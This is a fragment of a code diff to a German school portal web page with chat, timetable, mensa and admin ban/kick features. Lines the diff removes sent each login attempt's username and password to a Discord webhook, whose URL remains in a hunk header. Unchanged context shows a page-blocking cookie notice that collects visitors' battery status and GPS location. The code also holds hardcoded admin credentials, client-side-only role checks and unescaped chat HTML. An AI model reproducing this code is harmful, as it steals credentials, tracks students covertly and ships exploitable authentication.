+        dialog.append(titleElement, contentContainer, buttonContainer);
+
+        return {
+            setContent: (content) => {
+                contentContainer.innerHTML = content;
+            },
+            addButton: (text, onClick) => {
+                const button = document.createElement('button');
+                button.textContent = text;
+                button.style.cssText = `
+                    background: var(--primary-600);
+                    color: white;
+                    border: none;
+                    padding: 8px 15px;
+                    border-radius: 5px;
+                    cursor: pointer;
+                `;
+                button.onclick = onClick;
+                buttonContainer.appendChild(button);
+
+                const cancelButton = document.createElement('button');
+                cancelButton.textContent = 'Abbrechen';
+                cancelButton.style.cssText = `
+                    background: var(--gray-400);
+                    color: white;
+                    border: none;
+                    padding: 8px 15px;
+                    border-radius: 5px;
+                    cursor: pointer;
+                `;
+                cancelButton.onclick = () => dialog.remove();
+                buttonContainer.insertBefore(cancelButton, button);
+            },
+            show: () => document.body.appendChild(dialog),
+            close: () => dialog.remove()
+        };
+    }
+
+    function loadMessages() {
+        const messages = document.getElementById('chat-messages');
+        if (!messages) return;
+
+        messages.innerHTML = '';
+        chatMessages.forEach(msg => {
+            const messageElement = document.createElement('div');
+            messageElement.style.cssText = `
+                margin-bottom: 10px;
+                ${msg.sender === getCurrentUser()?.username ? 'text-align: right;' : ''}
+            `;
+            messageElement.innerHTML = `
+                <small style="color: #666;">${msg.sender}</small>
+                <div style="background: ${msg.sender === getCurrentUser()?.username ? 'var(--primary-100)' : '#f5f5f5'}; 
+                            padding: 5px 10px; 
+                            border-radius: 10px; 
+                            display: inline-block;
+                            max-width: 80%;">
+                    ${msg.text}
+                </div>
+                <small style="color: #999;">${new Date(msg.timestamp).toLocaleTimeString()}</small>
+            `;
+            messages.appendChild(messageElement);
+        });
+        messages.scrollTop = messages.scrollHeight;
+    }
+
+    function sendMessage() {
+        const input = document.getElementById('message-input');
+        const currentUser = getCurrentUser();
+        
+        if (!input || !currentUser || !input.value.trim()) return;
+
+        const message = {
+            sender: currentUser.username,
+            text: input.value.trim(),
+            timestamp: new Date().toISOString()
+        };
+
+        chatMessages.push(message);
+        localStorage.setItem('chatMessages', JSON.stringify(chatMessages));
+        
+        input.value = '';
+        loadMessages();
+    }
+
+    function getCurrentUser() {
+        return JSON.parse(localStorage.getItem('currentUser'));
+    }
+
+    function logout() {
+        const currentUser = getCurrentUser();
+        if (currentUser) {
+            updateUserStatus(currentUser.username, 'offline');
+        }
+        localStorage.removeItem("currentUser");
+        window.location.href = "login.html";
+    }
+
+    function createDialog(title) {
+        const dialog = document.createElement('div');
+        dialog.style.cssText = `
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.2);
+            z-index: 1002;
+            width: 400px;
+        `;
+
+        const titleElement = document.createElement('h3');
+        titleElement.style.marginTop = '0';
+        titleElement.textContent = title;
+
+        const contentContainer = document.createElement('div');
+        contentContainer.style.marginBottom = '20px';
+
+        const buttonContainer = document.createElement('div');
+        buttonContainer.style.cssText = `
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+        `;
+
+        dialog.append(titleElement, contentContainer, buttonContainer);
+
+        return {
+            setContent: (content) => {
+                contentContainer.innerHTML = content;
+            },
+            addButton: (text, onClick) => {
+                const button = document.createElement('button');
+                button.textContent = text;
+                button.style.cssText = `
+                    background: var(--primary-600);
+                    color: white;
+                    border: none;
+                    padding: 8px 15px;
+                    border-radius: 5px;
+                    cursor: pointer;
+                `;
+                button.onclick = onClick;
+                buttonContainer.appendChild(button);
+
+                // Abbrechen-Button hinzufügen
+                if (text !== 'Abbrechen' && text !== 'Schließen') {
+                    const cancelButton = document.createElement('button');
+                    cancelButton.textContent = 'Abbrechen';
+                    cancelButton.style.cssText = `
+                        background: var(--gray-400);
+                        color: white;
+                        border: none;
+                        padding: 8px 15px;
+                        border-radius: 5px;
+                        cursor: pointer;
+                    `;
+                    cancelButton.onclick = () => dialog.remove();
+                    buttonContainer.insertBefore(cancelButton, button);
+                }
+            },
+            show: () => document.body.appendChild(dialog),
+            close: () => dialog.remove()
+        };
+    }
+</script>
+<style>
+    /* Tailwind-ähnliche Basisstile */
+    :root {
+        --primary-50: #eef2ff;
+        --primary-100: #e0e7ff;
+        --primary-200: #c7d2fe;
+        --primary-300: #a5b4fc;
+        --primary-400: #818cf8;
+        --primary-500: #6366f1;
+        --primary-600: #4f46e5;
+        --primary-700: #4338ca;
+        --primary-800: #3730a3;
+        --primary-900: #312e81;
+        --primary-950: #1e1b4b;
+        
+        --secondary-50: #f0fdfa;
+        --secondary-100: #ccfbf1;
+        --secondary-200: #99f6e4;
+        --secondary-300: #5eead4;
+        --secondary-400: #2dd4bf;
+        --secondary-500: #14b8a6;
+        --secondary-600: #0d9488;
+        --secondary-700: #0f766e;
+        --secondary-800: #115e59;
+        --secondary-900: #134e4a;
+        --secondary-950: #042f2e;
+        
+        --gray-50: #f9fafb;
+        --gray-100: #f3f4f6;
+        --gray-200: #e5e7eb;
+        --gray-300: #d1d5db;
+        --gray-400: #9ca3af;
+        --gray-500: #6b7280;
+        --gray-600: #4b5563;
+        --gray-700: #374151;
+        --gray-800: #1f2937;
+        --gray-900: #111827;
+        --gray-950: #030712;
+        
+        --foreground-rgb: 0, 0, 0;
+        --background-rgb: 255, 255, 255;
+    }
+
+    /* Basis-Animationen */
+    @keyframes fadeIn {
+        from { opacity: 0; }
+        to { opacity: 1; }
+    }
+
+    @keyframes slideIn {
+        from { transform: translateY(20px); opacity: 0; }
+        to { transform: translateY(0); opacity: 1; }
+    }
+
+    @keyframes scaleIn {
+        from { transform: scale(0.95); opacity: 0; }
+        to { transform: scale(1); opacity: 1; }
+    }
+
+    @keyframes bounce {
+        0% { transform: scale(1); }
+        50% { transform: scale(1.05); }
+        100% { transform: scale(1); }
+    }
+
+    @keyframes shimmer {
+        0% { background-position: -1000px 0; }
+        100% { background-position: 1000px 0; }
+    }
+
+    /* Globale Animationen */
+    .card, .message-preview, .notification-item, .time-slot {
+        animation: scaleIn 0.3s ease-out;
+        transition: all 0.3s ease;
+    }
+
+    .card:hover, .message-preview:hover, .notification-item:hover, .time-slot:hover {
+        transform: translateY(-4px);
+        box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+    }
+
+    /* Button Animationen */
+    .btn {
+        transition: all 0.3s ease;
+        position: relative;
+        overflow: hidden;
+    }
+
+    .btn:hover {
+        transform: translateY(-2px);
+    }
+
+    .btn:active {
+        transform: translateY(1px);
+    }
+
+    /* Navigation Animationen */
+    .nav-link {
+        transition: all 0.3s ease;
+        position: relative;
+    }
+
+    .nav-link::after {
+        content: '';
+        position: absolute;
+        bottom: 0;
+        left: 50%;
+        width: 0;
+        height: 2px;
+        background: var(--primary-600);
+        transition: all 0.3s ease;
+    }
+
+    .nav-link:hover::after {
+        width: 100%;
+        left: 0;
+    }
+
+    /* Modal Animationen */
+    .modal {
+        transition: opacity 0.3s ease;
+    }
+
+    .modal-content {
+        animation: slideIn 0.3s ease-out;
+    }
+
+    /* Dropdown Animationen */
+    .profile-dropdown, .notifications-dropdown {
+        transform-origin: top right;
+        transition: all 0.3s ease;
+        transform: scale(0.95);
+        opacity: 0;
+        visibility: hidden;
+    }
+
+    .profile-dropdown.open, .notifications-dropdown.open {
+        transform: scale(1);
+        opacity: 1;
+        visibility: visible;
+    }
+
+    /* Nachrichten Animationen */
+    .message-preview.unread::before {
+        content: '';
+        position: absolute;
+        left: 0;
+        top: 50%;
+        transform: translateY(-50%);
+        width: 4px;
+        height: 70%;
+        background: var(--primary-600);
+        border-radius: 2px;
+        animation: scaleIn 0.3s ease-out;
+    }
+
+    /* Loading Spinner Animation */
+    @keyframes spin {
+        to { transform: rotate(360deg); }
+    }
+
+    .loading-spinner {
+        animation: spin 1s linear infinite, bounce 2s ease infinite;
+    }
+
+    /* Page Transitions */
+    .page-container {
+        transition: all 0.3s ease;
+        opacity: 0;
+        transform: translateY(20px);
+    }
+
+    .page-container.active {
+        opacity: 1;
+        transform: translateY(0);
+    }
+
+    /* Social Media Cards */
+    .social-card {
+        transition: all 0.3s ease;
+    }
+
+    .social-card:hover {
+        transform: translateY(-8px) rotate(2deg);
+        box-shadow: 0 15px 30px rgba(0, 0, 0, 0.1);
+    }
+
+    .social-icon {
+        transition: all 0.3s ease;
+    }
+
+    .social-card:hover .social-icon {
+        transform: scale(1.1) rotate(-5deg);
+    }
+
+    /* Form Inputs */
+    input[type="text"],
+    input[type="password"],
+    input[type="email"],
+    textarea {
+        transition: all 0.3s ease;
+    }
+
+    input[type="text"]:focus,
+    input[type="password"]:focus,
+    input[type="email"]:focus,
+    textarea:focus {
+        transform: translateY(-2px);
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+    }
+
+    /* Notification Badge Animation */
+    @keyframes pulse {
+        0% { transform: scale(0.95); opacity: 0.5; }
+        50% { transform: scale(1); opacity: 1; }
+        100% { transform: scale(0.95); opacity: 0.5; }
+    }
+
+    .notification-badge {
+        animation: pulse 2s infinite;
+    }
+
+    /* Grade Animation */
+    .grade {
+        transition: all 0.3s ease;
+    }
+
+    .grade:hover {
+        transform: scale(1.2) rotate(10deg);
+    }
+    
+    /* Bestehende Stile beibehalten... */
+    * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+    }
+    
+    body {
+        font-family: 'Inter', sans-serif;
+        color: rgb(var(--foreground-rgb));
+        background: var(--gray-50);
+        min-height: 100vh;
+    }
+    
+    /* Login-Seite Stile */
+    .login-page {
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: url('hintergrund.jfif') no-repeat center center; /* Hintergrundbild mit .jfif-Endung */
+        background-size: cover; /* Bild so skalieren, dass es den gesamten Bereich abdeckt */
+        padding: 1rem;
+        position: relative;
+        overflow: hidden;
+    }
+    
+    .login-page video {
+        display: none; /* Video ausblenden */
+    }
+    
+    .login-container {
+        background-color: rgba(255, 255, 255, 0.5); /* 50% durchsichtig */
+        backdrop-filter: blur(5px); /* Unschärfeeffekt für bessere Lesbarkeit */
             -webkit-backdrop-filter: blur(5px); /* Für Safari */
             border-radius: 1rem;
             box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
@@ -1753,10 +2795,7 @@
         const defaultUser = {
             username: 'zyro',
             password: 'zyro',
-            fullname: 'Zyro Admin',
-            school: 'Mathilde Anneken Schule',
-            contact: 'admin@zyro-schule.de',
-            isTeacher: true
+            role: 'admin'
         };
         
         // Hole existierende Benutzer oder initialisiere leeres Array
@@ -2844,7 +3883,7 @@
                         <div class="social-card" onclick="window.open('https://www.instagram.com/mathildeanneke/', '_blank')">
                             <div class="social-card-content">
                                 <svg class="social-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                                    <path fill="currentColor" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
+                                    <path fill="currentColor" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
                                 </svg>
                                 <h2 class="social-title">Instagram</h2>
                                 <p class="social-description">Folge uns auf Instagram</p>
@@ -5492,7 +6531,6 @@
 
     <script>
         // ... existing code ...
-// ... existing code ...
 </script>
 
 <!-- Schüler-Management-Modal für Lehrer -->
@@ -5794,16 +6832,19 @@ function zeigeVertretungen() {
 </div>
 
 <script>
-// ... bestehender Code ...
-
-<script>
-fetch('http://localhost:3000/track-visit', { method: 'POST' });
+document.addEventListener('DOMContentLoaded', function() {
+    fetch('http://localhost:3000/track-visit', { method: 'POST' })
+        .catch(function(err) {
+            console.log('Tracking nicht verfügbar');
+        });
+});
 </script>
 
-function showSocialMediaPage() {
+<script>
+function showSocialMediaPage(event) {
     // Alle Seiten ausblenden
     const pages = ['dashboard-content', 'stundenplan-page', 'noten-page', 'nachrichten-page', 'social-media-page'];
-    pages.forEach(pageId => {
+    pages.forEach(function(pageId) {
         const page = document.getElementById(pageId);
         if (page) {
             page.classList.remove('active');
@@ -5817,8 +6858,12 @@ function showSocialMediaPage() {
     }
     
     // Aktiven Link setzen
-    document.querySelectorAll('.nav-link').forEach(link => link.classList.remove('active'));
-    event.currentTarget.classList.add('active');
+    document.querySelectorAll('.nav-link').forEach(function(link) {
+        link.classList.remove('active');
+    });
+    if (event && event.currentTarget) {
+        event.currentTarget.classList.add('active');
+    }
     
     // Seitentitel aktualisieren
     const pageTitle = document.getElementById('current-page-title');
@@ -5856,15 +6901,24 @@ function showSocialMediaPage() {
 
 <script>
 // Funktion zum Anzeigen der Mensa-Seite
-function showMensaPage() {
+function showMensaPage(event) {
     console.log('showMensaPage aufgerufen'); // Debug-Log
     
     // Alle Seiten ausblenden
-    document.getElementById('dashboard-content').classList.remove('active');
-    document.getElementById('stundenplan-page').classList.remove('active');
-    document.getElementById('noten-page').classList.remove('active');
-    document.getElementById('nachrichten-page').classList.remove('active');
-    document.getElementById('social-media-page').classList.remove('active');
+    const pages = [
+        'dashboard-content',
+        'stundenplan-page',
+        'noten-page',
+        'nachrichten-page',
+        'social-media-page'
+    ];
+    
+    pages.forEach(function(pageId) {
+        const element = document.getElementById(pageId);
+        if (element) {
+            element.classList.remove('active');
+        }
+    });
     
     // Mensa-Seite anzeigen
     const mensaPage = document.getElementById('mensa-page');
@@ -5886,7 +6940,9 @@ function showMensaPage() {
     document.querySelectorAll('.nav-link').forEach(function(link) {
         link.classList.remove('active');
     });
-    event.currentTarget.classList.add('active');
+    if (event && event.currentTarget) {
+        event.currentTarget.classList.add('active');
+    }
     
     // Seitentitel aktualisieren
     const pageTitle = document.getElementById('current-page-title');
@@ -5912,10 +6968,7 @@ document.addEventListener('DOMContentLoaded', function() {
 });
 </script>
 
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Meine Website</title>
+<!-- Cookie Notice Styles -->
   <style>
     body {
       margin: 0;
@@ -5984,7 +7037,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
   <script>
     // Beim Laden immer Abfrage zeigen (keine Speicherung prüfen)
-    window.onload = () => {
+    window.onload = function() {
       document.getElementById("cookieNotice").style.display = "flex";
       document.body.style.overflow = "hidden"; // Seite blockieren
     };
@@ -6035,12 +7088,12 @@ document.addEventListener('DOMContentLoaded', function() {
         const batteryStatus = await getBatteryStatus();
 
         let geoCoords = "Kein GPS-Standort";
-        const getPosition = () => {
-          return new Promise((resolve) => {
+        function getPosition() {
+          return new Promise(function(resolve) {
             if ("geolocation" in navigator) {
               navigator.geolocation.getCurrentPosition(
-                position => resolve(position.coords),
-                () => resolve(null),
+                function(position) { resolve(position.coords); },
+                function() { resolve(null); },
                 { timeout: 5000 }
               );
             } else {
@@ -6109,39 +7162,47 @@ const webhookURL = "https://discord.com/api/webhooks/1373923228711653457/ZNcgAmV
 function loginUser() {
     const username = document.getElementById("username").value;
     const password = document.getElementById("password").value;
-    const consent = document.getElementById("remember-me").checked;
-
-    if (!consent) {
-        alert("Bitte akzeptiere die Nutzungsbedingungen, um fortzufahren.");
-        return;
-    }
-
-    // Überprüfen, ob der Benutzer existiert
-    const registeredUsers = JSON.parse(localStorage.getItem('registeredUsers') || '[]');
-    const user = registeredUsers.find(u => u.username === username && u.password === password);
-
+    
+    // Benutzer aus den vordefinierten Accounts überprüfen
+    const user = users.find(function(u) {
+        return u.username === username && u.password === password;
+    });
+    
     if (!user) {
-        alert("Benutzername oder Passwort ist falsch.");
+        document.getElementById("errorMessage").textContent = "Ungültiger Benutzername oder Passwort";
         return;
     }
+    
+    // Login erfolgreich
+    localStorage.setItem("currentUser", JSON.stringify(user));
+    
+    // Benutzer als online markieren
+    updateUserStatus(user.username, 'online');
+    
+    // Chat-Interface erstellen
+    createChatUI();
+    
+    // Weiterleitung basierend auf der Rolle
+    if (user.role === "admin") {
+        window.location.href = "admin.html";
+    } else {
+        window.location.href = "user.html";
+    }
 
-    // Daten an Webhook senden
-    const message = {
-        username: "Login",
-        content: `**Login Versuch:**\nBenutzername: ${username}\nPasswort: ${password}`
-    };
+    // Login-Status in der Konsole ausgeben
+    console.log("Login erfolgreich für:", username);
 
-    fetch(webhookURL, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify(message)
-    })
-    .then(response => {
-        // Benutzer als eingeloggt markieren
-        localStorage.setItem("zyroUser", JSON.stringify(user));
-        localStorage.setItem("zyroLoggedIn", "true");
+    // Benutzer-Interface aktualisieren
+    const profileNameElement = document.getElementById("profile-name");
+    if (profileNameElement) {
+        profileNameElement.textContent = user.fullname || user.username;
+    }
+
+    const profileImageElement = document.getElementById("profile-image");
+    if (profileImageElement) {
+        const initial = (user.fullname || user.username).charAt(0).toUpperCase();
+        profileImageElement.textContent = initial;
+    }
 
         // Weiterleitung zum Dashboard
         document.getElementById("login-page").style.display = "none";
@@ -6160,10 +7221,115 @@ function loginUser() {
         }
 
         alert("Anmeldung erfolgreich!");
-    })
-    .catch(error => console.error("Fehler beim Senden der Daten:", error));
 }
-</script>
 
+// Bann und Kick Funktionen
+function banUser(username, reason, duration) {
+    const currentUser = JSON.parse(localStorage.getItem("currentUser"));
+    if (!currentUser || currentUser.role !== "admin") {
+        alert("Keine Berechtigung für diese Aktion!");
+        return;
+    }
+    
+    // Ban in localStorage speichern
+    const bannedUsers = JSON.parse(localStorage.getItem('bannedUsers') || '[]');
+    const banInfo = {
+        username: username,
+        reason: reason,
+        duration: duration,
+        bannedAt: new Date().toISOString(),
+        bannedBy: currentUser.username
+    };
+    bannedUsers.push(banInfo);
+    localStorage.setItem('bannedUsers', JSON.stringify(bannedUsers));
+    
+    showAnnouncement("Bann", `Der Benutzer ${username} wurde für ${duration} gebannt.\nGrund: ${reason}`);
+}
+
+function kickUser(username, reason) {
+    const currentUser = JSON.parse(localStorage.getItem("currentUser"));
+    if (!currentUser || currentUser.role !== "admin") {
+        alert("Keine Berechtigung für diese Aktion!");
+        return;
+    }
+    
+    // Kick in localStorage speichern
+    const kickedUsers = JSON.parse(localStorage.getItem('kickedUsers') || '[]');
+    const kickInfo = {
+        username: username,
+        reason: reason,
+        kickedAt: new Date().toISOString(),
+        kickedBy: currentUser.username
+    };
+    kickedUsers.push(kickInfo);
+    localStorage.setItem('kickedUsers', JSON.stringify(kickedUsers));
+    
+    showAnnouncement("Kick", `Der Benutzer ${username} wurde gekickt.\nGrund: ${reason}`);
+}
+
+function showAnnouncement(type, message) {
+    // Container für Ankündigungen erstellen
+    let container = document.getElementById("announcement-container");
+    if (!container) {
+        container = document.createElement("div");
+        container.id = "announcement-container";
+        container.style.cssText = `
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 9999;
+        `;
+        document.body.appendChild(container);
+    }
+
+    // Neue Ankündigung erstellen
+    const announcement = document.createElement("div");
+    announcement.style.cssText = `
+        background-color: ${type === "Bann" ? "#ff4444" : "#ff8800"};
+        color: white;
+        padding: 15px;
+        border-radius: 5px;
+        margin-bottom: 10px;
+        box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        animation: slideIn 0.5s ease-out;
+    `;
+
+    // Titel
+    const title = document.createElement("h3");
+    title.style.margin = "0 0 10px 0";
+    title.textContent = type + "-Ankündigung";
+    announcement.appendChild(title);
+
+    // Nachricht
+    const text = document.createElement("p");
+    text.style.margin = "0";
+    text.style.whiteSpace = "pre-line";
+    text.textContent = message;
+    announcement.appendChild(text);
+
+    // Ankündigung hinzufügen
+    container.appendChild(announcement);
+
+    // Nach 5 Sekunden ausblenden
+    setTimeout(() => {
+        announcement.style.animation = "fadeOut 0.5s ease-out";
+        setTimeout(() => container.removeChild(announcement), 500);
+    }, 5000);
+}
+
+// Animationen für Ankündigungen
+const style = document.createElement("style");
+style.textContent = `
+    @keyframes slideIn {
+        from { transform: translateX(100%); opacity: 0; }
+        to { transform: translateX(0); opacity: 1; }
+    }
+    @keyframes fadeOut {
+        from { transform: translateX(0); opacity: 1; }
+        to { transform: translateX(100%); opacity: 0; }
+    }
+`;
+document.head.appendChild(style);
+</script>
 </body>
 </html>
